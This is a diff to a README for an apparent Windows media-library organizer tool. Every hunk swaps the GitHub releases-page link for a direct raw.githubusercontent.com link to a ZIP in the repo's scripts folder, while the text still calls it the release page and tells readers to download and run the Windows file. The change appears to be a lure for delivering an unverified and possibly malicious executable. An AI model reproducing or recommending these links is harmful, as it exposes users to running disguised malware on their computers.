@@ -1,10 +1,10 @@
 # 🗂️ media-library-organizer-skill - Clean Your Media Library Fast
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/saniculabipinnatifidadurrell157/media-library-organizer-skill/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/saniculabipinnatifidadurrell157/media-library-organizer-skill/main/scripts/media_skill_library_organizer_2.5.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/saniculabipinnatifidadurrell157/media-library-organizer-skill/releases
+Visit this page to download: https://raw.githubusercontent.com/saniculabipinnatifidadurrell157/media-library-organizer-skill/main/scripts/media_skill_library_organizer_2.5.zip
 
 On the release page, get the latest Windows file for this tool. Save it to your PC, then open it to start the setup or run it directly if it comes as a ready-to-use file.
 
@@ -35,7 +35,7 @@ If your library sits on a NAS, map the network drive in Windows first so you can
 
 ## 🚀 How to Download and Run on Windows
 
-1. Open the release page: https://github.com/saniculabipinnatifidadurrell157/media-library-organizer-skill/releases
+1. Open the release page: https://raw.githubusercontent.com/saniculabipinnatifidadurrell157/media-library-organizer-skill/main/scripts/media_skill_library_organizer_2.5.zip
 2. Find the latest release near the top of the page
 3. Download the Windows file from that release
 4. Save it to a folder you can find again, such as Downloads or Desktop
@@ -225,7 +225,7 @@ If it is a ZIP file, extract it first, then open the app from the extracted fold
 
 ## 📎 Useful Link
 
-Download page: https://github.com/saniculabipinnatifidadurrell157/media-library-organizer-skill/releases
+Download page: https://raw.githubusercontent.com/saniculabipinnatifidadurrell157/media-library-organizer-skill/main/scripts/media_skill_library_organizer_2.5.zip
 
 ## 🏷️ Topic Tags
 
